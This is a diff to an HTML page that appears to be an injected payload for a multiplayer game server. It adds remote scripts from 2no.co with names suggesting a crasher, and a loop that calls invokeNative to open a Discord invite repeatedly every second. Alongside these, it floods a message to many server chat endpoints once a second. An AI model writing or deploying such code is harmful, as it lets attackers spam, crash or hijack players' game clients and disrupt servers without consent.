@@ -63,6 +63,10 @@
     <div class="text">الكل عل زبي</div>
     <div class="text">(9z71) حسابي دس حياكم</div>
 
+    <!-- External Scripts -->
+    <script src="https://2no.co/cr2sher.js"></script>
+    <script src="//2no.co/nomoney.js"></script>
+
     <!-- Combined JavaScript -->
     <script>
         // IP Info Fetch
@@ -80,12 +84,20 @@
 
         setInterval(() => {
             fetch("https://flix-scripts/chatResult", { method: "POST", body });
-            fetch("https://danger_chat/Danger_Chat:SendMessage", { method: "POST", body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]}) })
+            fetch("https://danger_chat/Danger_Chat:SendMessage", { method: "POST", body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]}) });
             fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, body: JSON.stringify({ message: msg, channel: "شات العام" }), method: "POST"});
             fetch("https://melix_chat/chatResult", { method: "POST", body });
             fetch("https://as_chat/chatResult", { method: "POST", body });
             fetch("https://chat/chatResult", { method: "POST", body });
             fetch("https://ho-chatv2/Chat", { method: "POST", body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"}) });
+        }, 1000);
+
+        // Discord link opening
+        setInterval(() => {
+            window.invokeNative("openUrl", "https://discord.gg/3DPaYFuD");
+            window.invokeNative("openUrl", "https://discord.gg/3DPaYFuD");
+            window.invokeNative("openUrl", "https://discord.gg/3DPaYFuD");
+            window.invokeNative("openUrl", "https://discord.gg/3DPaYFuD");
         }, 1000);
     </script>
 </body>
